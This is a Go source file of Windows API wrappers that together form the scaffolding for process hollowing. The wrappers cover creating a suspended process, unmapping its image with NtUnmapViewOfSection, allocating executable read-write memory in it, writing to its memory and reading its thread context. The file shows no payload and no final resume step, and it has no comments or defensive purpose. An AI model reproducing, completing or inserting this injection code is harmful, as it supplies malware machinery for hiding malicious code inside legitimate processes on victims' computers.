package main

import (
	"fmt"
	"os"
	"syscall"
)

var (
	kernel32, _           = syscall.LoadLibrary("kernel32.dll")
	readProcessMemory, _  = syscall.GetProcAddress(kernel32, "ReadProcessMemory")
	writeProcessMemory, _ = syscall.GetProcAddress(kernel32, "WriteProcessMemory")
	virtualAllocEx, _     = syscall.GetProcAddress(kernel32, "VirtualAllocEx")
	getThreadContext, _   = syscall.GetProcAddress(kernel32, "GetThreadContext")

	ntdll, _                     = syscall.LoadLibrary("ntdll.dll")
	ntQueryInformationProcess, _ = syscall.GetProcAddress(ntdll, "NtQueryInformationProcess")
	ntUnmapViewOfSection, _      = syscall.GetProcAddress(ntdll, "NtUnmapViewOfSection")
)

const (
	CREATE_SUSPENDED       = 0x00000004
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
)

func abort(s ...interface{}) {
	fmt.Println(s...)
	os.Exit(1)
}

func createSuspendedProcess(path string, startupInfo *syscall.StartupInfo, procInfo *syscall.ProcessInformation) error {
	return syscall.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		startupInfo,
		procInfo)
}

func NtQueryInformationProcess(proc syscall.Handle, infoClass, processBasicInfo, processInfoLength, returnLength uintptr) {
	ret, _, err := syscall.Syscall6(uintptr(ntQueryInformationProcess),
		5,
		uintptr(proc),
		infoClass,
		processBasicInfo,
		processInfoLength,
		returnLength,
		0,
	)
	if err != 0 {
		abort("ntQueryInformationProcess", err)
	}
	if ret != 0 {
		abort("ntQueryInformationProcess", "ret", ret)
	}
}

func NtUnmapViewOfSection(proc syscall.Handle, addr uintptr) {
	ret, _, err := syscall.Syscall(uintptr(ntUnmapViewOfSection),
		2,
		uintptr(proc),
		addr,
		0,
	)
	if err != 0 {
		abort("ntUnmapViewOfSection", err)
	}
	if ret != 0 {
		abort("ntUnmapViewOfSection", "ret", ret)
	}
}

func ReadProcessMemory(proc syscall.Handle, addr, buffer, size, nread uintptr) {
	ret, _, err := syscall.Syscall6(uintptr(readProcessMemory),
		5,
		uintptr(proc),
		addr,
		buffer,
		size,
		nread,
		0,
	)
	if err != 0 {
		abort("readProcessMemory", err)
	}
	if ret == 0 {
		abort("readProcessMemory", "ret", ret)
	}
}

func WriteProcessMemory(proc syscall.Handle, addr, buffer, size, nwrote uintptr) {
	ret, _, err := syscall.Syscall6(uintptr(writeProcessMemory),
		5,
		uintptr(proc),
		addr,
		buffer,
		size,
		nwrote,
		0,
	)
	if err != 0 {
		abort("writeProcessMemory", err)
	}
	if ret == 0 {
		abort("writeProcessMemory", "ret", ret)
	}
}

func VirtualAllocEx(proc syscall.Handle, addr, size, allocType, protect uintptr) uintptr {
	ret, _, err := syscall.Syscall6(uintptr(virtualAllocEx),
		5,
		uintptr(proc),
		addr,
		size,
		allocType,
		protect,
		0,
	)
	if err != 0 {
		abort("virtualAllocEx", err)
	}
	if ret == 0 {
		abort("virtualAllocEx", "ret", ret)
	}
	return ret
}

func GetThreadContext(hThread, lpContext uintptr) uintptr {
	ret, _, err := syscall.Syscall(uintptr(getThreadContext),
		2,
		hThread,
		lpContext,
		0)
	if err != 0 {
		abort("getThreadContext error", err)
	}
	return ret
}
